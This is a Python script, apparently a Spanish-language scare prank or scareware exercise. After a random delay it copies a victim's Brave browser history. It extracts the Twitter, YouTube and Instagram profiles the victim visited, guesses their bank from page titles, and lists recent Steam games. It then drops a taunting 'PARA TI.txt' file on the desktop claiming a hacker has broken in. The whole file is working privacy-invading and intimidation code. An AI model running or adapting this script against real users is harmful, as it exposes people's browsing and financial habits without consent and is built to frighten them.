import glob
import os
import re
import sqlite3
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange

HACKER_FILE = "PARA TI.txt"


def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    n_hours = randrange(1, 4)
    n_minuts = randrange(1, 60)
    print("Sleeping {} hours and {} minuts".format(n_hours, n_minuts))
    sleep(n_hours)  # * 60 * 60
    sleep(n_minuts)  # * 60


def create_hacker_file(user_path):
    hacker_file = open(user_path + "DESKTOP/" + HACKER_FILE, "w")
    hacker_file.write("Hola, soy un hacker y he entrado a tu sistema.\n")
    return hacker_file


def get_brave_history(user_path):
    urls = None
    while not urls:

        try:
            history_path = user_path + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time,url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("No se ha podido obtener el archivo, se intentara de nuevo en 5 segundos ")
            sleep(5)


def twitter_profiles(hacker_file, brave_history):
    profiles_visited = []
    for item in brave_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home", "login"]:
            profiles_visited.append(results[0])
        else:
            pass
    hacker_file.write("\nHas visitado estos perfiles de twitter {} ¿no?...\n".format(", ".join(profiles_visited)))


def youtube_channels(hacker_file, brave_history):
    youtube_channels_visited = []
    for item in brave_history:
        results = re.findall("https://www.youtube.com/@([A-z0-9-]+)$", item[2])
        if results and results[0]:
            youtube_channels_visited.append(results[0])
        else:
            pass
    hacker_file.write("\nTambien visitaste estos canales  {} en youtube\n".format(", ".join(youtube_channels_visited)))


def instagram_profiles(hacker_file, brave_history):
    instagram_profiles_visited = []
    for item in brave_history:
        results = re.findall("https://www.instagram.com/([A-Za-z0-9]+)/$", item[2])
        if results and results[0]:
            instagram_profiles_visited.append(results[0])
        else:
            pass
    hacker_file.write(
        "\nVes estos perfiles en instagram: {} , interesante\n".format((", ".join(instagram_profiles_visited))))


def check_bank_accounts(hacker_file, brave_history):
    his_bank = None
    banks = ["Galicia", "BICA", "Itaú", "BANCO DE LA PROVINCIA DE BUENOS AIRES", "BBVA ",
             "BANCO DE LA NACION "]
    for item in brave_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
            else:
                pass
        if his_bank:
            break
    hacker_file.write("\nAdemas veo que guardas tu dinero en el Banco {}, jajajaja esto es genial\n".format(his_bank))


def check_steam_games(hacker_file):
    steam_path = "D:\\SteamLibrary\\steamapps\\common\\*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append(game_path.split("\\")[-1])
    else:
        pass
    hacker_file.write("\nHas estado jugando  {}, que manco jajajaja\n".format(", ".join(games[:3])))


def main():
    # Wait 1-3 hours to load file
    delay_action()
    # Search data user of windows
    user_path = get_user_path()
    # Download user history, or wait until get the access
    brave_history = get_brave_history(user_path)
    # Create a file in desk
    hacker_file = create_hacker_file(user_path)
    # Check Twitter and scare the user
    twitter_profiles(hacker_file, brave_history)
    # Check YouTube and scare the user
    youtube_channels(hacker_file, brave_history)
    # Check Instagram and scare user
    instagram_profiles(hacker_file, brave_history)
    # Check bank
    check_bank_accounts(hacker_file, brave_history)
    # Check Steam videogames
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()